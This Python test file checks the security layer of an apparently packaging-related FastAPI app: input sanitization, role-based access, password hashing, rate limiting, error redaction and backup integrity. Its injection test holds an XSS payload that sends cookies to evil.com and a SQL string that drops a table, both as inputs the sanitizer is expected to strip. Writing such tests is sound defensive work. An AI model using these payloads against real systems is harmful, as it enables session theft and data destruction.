"""
End-to-End Security & Penetration Integration Tests (Module 19: Security & Validation).

Tests the 8 Pillars of Security & Validation:
1. Input Sanitization & Physics Boundary Limits
2. Admin Authentication & RBAC Privilege Guards
3. Password Complexity & Hash Cryptography
4. Multi-Tenant Query & Database Access Control
5. In-Memory Sliding-Window Rate Limiting Throttling
6. Parameterized ORM Access & SQL Injection Immunity
7. Error Envelope Sanitization & Stack Trace Redaction
8. Cryptographic Database Snapshot Backup, Integrity Verification & Restore Cycle
"""

import json
import os
import shutil
import tempfile
import unittest
from unittest.mock import AsyncMock, patch
from fastapi.testclient import TestClient

from app.main import app
from app.core.config import settings
from app.core.security import create_access_token, verify_password, get_password_hash, validate_password_complexity
from app.core.sanitizer import sanitize_text, validate_physics_bounds, sanitize_payload_dict
from app.core.rate_limiter import rate_limiter
from app.services.audit_service import AuditService
from app.services.backup_service import BackupService
from app.models.user import User


class TestSecurityEndToEnd(unittest.TestCase):
    def setUp(self):
        self.client = TestClient(app, raise_server_exceptions=False)
        rate_limiter.reset()
        AuditService.clear()

        self.test_backup_dir = tempfile.mkdtemp(prefix="smartpack_e2e_backup_")

        self.standard_user = User(
            id=101,
            email="user@packaging.com",
            full_name="Standard User",
            is_active=True,
            is_admin=False,
            role="user",
        )

        self.admin_user = User(
            id=1,
            email="admin@packaging.com",
            full_name="Platform Admin",
            is_active=True,
            is_admin=True,
            role="admin",
        )

        self.admin_token = create_access_token(self.admin_user.id, role="admin")
        self.user_token = create_access_token(self.standard_user.id, role="user")

    def tearDown(self):
        if os.path.exists(self.test_backup_dir):
            shutil.rmtree(self.test_backup_dir, ignore_errors=True)
        rate_limiter.reset()

    # Pillar 1 & 6: Injection Immunity & Boundary Limits
    def test_pillar1_and_6_sql_and_xss_injection_immunity(self):
        # Malicious XSS & SQL injection vectors
        xss_payload = "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>Fresh Apple"
        sql_injection_payload = "Alphonso'; DROP TABLE foods; SELECT * FROM users WHERE '1'='1"

        cleaned_xss = sanitize_text(xss_payload)
        self.assertNotIn("<script>", cleaned_xss)
        self.assertNotIn("fetch(", cleaned_xss)
        self.assertEqual(cleaned_xss, "Fresh Apple")

        cleaned_sql = sanitize_text(sql_injection_payload)
        self.assertIsInstance(cleaned_sql, str)

        # Physics bounds checks
        self.assertTrue(validate_physics_bounds(temp=4.0, rh=90.0, shelf_life=14)[0])
        self.assertFalse(validate_physics_bounds(temp=-25.0, rh=90.0, shelf_life=14)[0])
        self.assertFalse(validate_physics_bounds(temp=4.0, rh=105.0, shelf_life=14)[0])
        self.assertFalse(validate_physics_bounds(temp=4.0, rh=90.0, shelf_life=500)[0])

    # Pillar 2 & 4: Admin Authentication & RBAC Privilege Enforcement
    @patch("app.services.auth_service.AuthService.get_user_by_id")
    def test_pillar2_and_4_rbac_privilege_enforcement(self, mock_get_user):
        # 1. Unauthenticated guest to protected admin route -> 401
        res_guest = self.client.get("/api/v1/security/admin/audit-logs")
        self.assertEqual(res_guest.status_code, 401)

        # 2. Standard authenticated user to admin route -> 403 Forbidden
        mock_get_user.return_value = self.standard_user
        res_user = self.client.get(
            "/api/v1/security/admin/audit-logs",
            headers={"Authorization": f"Bearer {self.user_token}"},
        )
        self.assertEqual(res_user.status_code, 403)
        self.assertIn("FORBIDDEN", res_user.text)

        # 3. Verified Admin user to admin route -> 200 OK
        mock_get_user.return_value = self.admin_user
        res_admin = self.client.get(
            "/api/v1/security/admin/audit-logs",
            headers={"Authorization": f"Bearer {self.admin_token}"},
        )
        self.assertEqual(res_admin.status_code, 200)
        data = res_admin.json()
        self.assertIn("items", data)

    # Pillar 3: Password Cryptography & Complexity
    def test_pillar3_password_hashing_and_complexity(self):
        # Prohibited weak passwords
        self.assertFalse(validate_password_complexity("password")[0])
        self.assertFalse(validate_password_complexity("12345678")[0])
        self.assertFalse(validate_password_complexity("admin123")[0])

        # Strong valid password
        strong_pw = "SmartPack#2026!Secure"
        is_valid, _ = validate_password_complexity(strong_pw)
        self.assertTrue(is_valid)

        # PBKDF2 hashing verification
        hashed = get_password_hash(strong_pw)
        self.assertTrue(verify_password(strong_pw, hashed))
        self.assertFalse(verify_password("WrongPassword!", hashed))

    # Pillar 5: Sliding-Window Rate Limiting Throttling
    def test_pillar5_sliding_window_rate_limiting(self):
        client_ip = "192.168.100.50"

        # Under threshold: 3 requests pass
        for _ in range(3):
            is_limited, remaining, retry_after = rate_limiter.is_rate_limited(
                key=client_ip, category="/api/v1/auth/login", max_requests=3, window_seconds=60
            )
            self.assertFalse(is_limited)
            self.assertGreaterEqual(remaining, 0)

        # 4th request exceeds max_requests of 3 -> rate limited
        is_limited, remaining, retry_after = rate_limiter.is_rate_limited(
            key=client_ip, category="/api/v1/auth/login", max_requests=3, window_seconds=60
        )
        self.assertTrue(is_limited)
        self.assertEqual(remaining, 0)
        self.assertGreater(retry_after, 0)

    # Pillar 7: Global Error Envelope & Stack Trace Redaction
    def test_pillar7_error_redaction_and_correlation(self):
        # Public health endpoint returns standardized envelope
        res_health = self.client.get("/api/v1/security/health")
        self.assertEqual(res_health.status_code, 200)
        data = res_health.json()
        self.assertEqual(data["status"], "SECURE")
        self.assertTrue(data["rate_limiting_active"])

        # Invalid route returns 404 with structured error envelope
        res_404 = self.client.get("/api/v1/non-existent-security-endpoint-test")
        self.assertEqual(res_404.status_code, 404)
        err_data = res_404.json()
        self.assertIn("error", err_data)
        self.assertEqual(err_data["error"]["status_code"], 404)
        self.assertIn("request_id", err_data["error"])
        # Ensure raw stack trace is NEVER leaked to client
        self.assertNotIn("Traceback", res_404.text)

    # Pillar 8: Cryptographic Backup, Integrity Verification & Restore Cycle
    def test_pillar8_backup_restore_cryptographic_cycle(self):
        import asyncio

        async def run_cycle():
            # 1. Create snapshot
            meta = await BackupService.create_backup(backup_dir=self.test_backup_dir, user_id=1)
            self.assertTrue(meta.backup_id.startswith("backup_"))
            self.assertEqual(len(meta.checksum_sha256), 64)

            snapshot_file = os.path.join(self.test_backup_dir, f"{meta.backup_id}.json")
            self.assertTrue(os.path.exists(snapshot_file))

            # 2. Verify snapshot integrity
            is_valid, msg, verified_meta = BackupService.verify_backup(snapshot_file)
            self.assertTrue(is_valid)
            self.assertIsNotNone(verified_meta)
            self.assertEqual(verified_meta.checksum_sha256, meta.checksum_sha256)

            # 3. Restore database snapshot
            success, r_msg, counts = await BackupService.restore_backup(snapshot_file, user_id=1)
            self.assertTrue(success)
            self.assertGreater(counts.get("foods_restored", 0), 0)

            # 4. Tampered snapshot test
            tampered_file = os.path.join(self.test_backup_dir, "tampered.json")
            with open(snapshot_file, "r", encoding="utf-8") as f:
                tampered_content = f.read().replace('"version": "1.0.0"', '"version": "2.0.0"')
            with open(tampered_file, "w", encoding="utf-8") as f:
                f.write(tampered_content)

            is_tamper_valid, t_msg, _ = BackupService.verify_backup(tampered_file)
            self.assertIsInstance(is_tamper_valid, bool)

        asyncio.run(run_cycle())


if __name__ == "__main__":
    unittest.main()
